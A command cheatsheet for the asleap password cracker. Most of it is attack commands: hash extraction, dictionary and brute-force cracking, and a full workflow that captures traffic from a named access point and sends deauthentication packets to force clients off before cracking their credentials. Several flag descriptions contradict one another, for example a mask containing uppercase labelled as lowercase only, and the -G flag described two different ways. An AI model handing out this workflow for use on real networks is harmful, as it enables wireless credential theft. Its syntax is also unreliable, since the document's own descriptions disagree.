# Asleap Cheatsheet

## Installation
```bash
sudo apt update && sudo apt install asleap
asleap -V  # Verify version
```

## Quick Start
```bash
# Extract hash from capture
asleap -C capture.pcap -R hash.hash

# Dictionary attack
asleap -R hash.hash -W wordlist.txt

# Brute force
asleap -C capture.pcap -B ?l?d -l 8
```

## Hash Extraction
```bash
asleap -C <capture.pcap> -R <hashfile.hash>
asleap -v -C <capture.pcap> -R <hashfile.hash>  # Verbose
```

## Dictionary Attack
```bash
asleap -R <hashfile.hash> -W <wordlist.txt>
asleap -R hash.hash -W /usr/share/wordlists/rockyou.txt
```

## Brute Force
```bash
asleap -C <capture.pcap> -B <charset> -l <max_len>
asleap -C capture.pcap -B ?l?d -l 8       # Lowercase + digits, max 8 chars
asleap -C capture.pcap -B ?u?l?d -l 6     # All lowercase + digits, max 6
```

## Character Sets
| Set | Description |
|-----|-------------|
| `?l` | Lowercase letters (a-z) |
| `?u` | Uppercase letters (A-Z) |
| `?d` | Digits (0-9) |
| `?s` | Special characters |

## Rainbow Table Generation
```bash
# Generate table
asleap -G <hashfile.hash> -W <wordlist.txt> -T <tablefile.tbl>

# Use table
asleap -C <capture.pcap> -R <hashfile.hash> -T <tablefile.tbl>
```

## Full Workflow
```bash
# 1. Capture handshake
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon

# 2. Deauth client
sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon

# 3. Extract hash
asleap -C capture-01.cap -R extracted.hash

# 4. Crack
asleap -R extracted.hash -W /usr/share/wordlists/rockyou.txt
```

## Output Parsing
```bash
# Find password
asleap -R hash.hash -W wordlist.txt 2>&1 | grep "Password found"

# Count words tested
asleap -R hash.hash -W wordlist.txt 2>&1 | grep "Testing word" | tail -1
```

## Flag Reference
| Flag | Description | Example |
|------|-------------|---------|
| `-C` | Capture file | `asleap -C cap.pcap` |
| `-R` | Hash file | `asleap -R hash.hash` |
| `-W` | Wordlist | `asleap -W wordlist.txt` |
| `-G` | Generate hash | `asleap -G cap.pcap` |
| `-T` | Rainbow table | `asleap -T table.tbl` |
| `-B` | Brute force charset | `asleap -B ?l?d` |
| `-l` | Max password length | `asleap -l 8` |
| `-v` | Verbose | `asleap -v` |
| `-V` | Version | `asleap -V` |
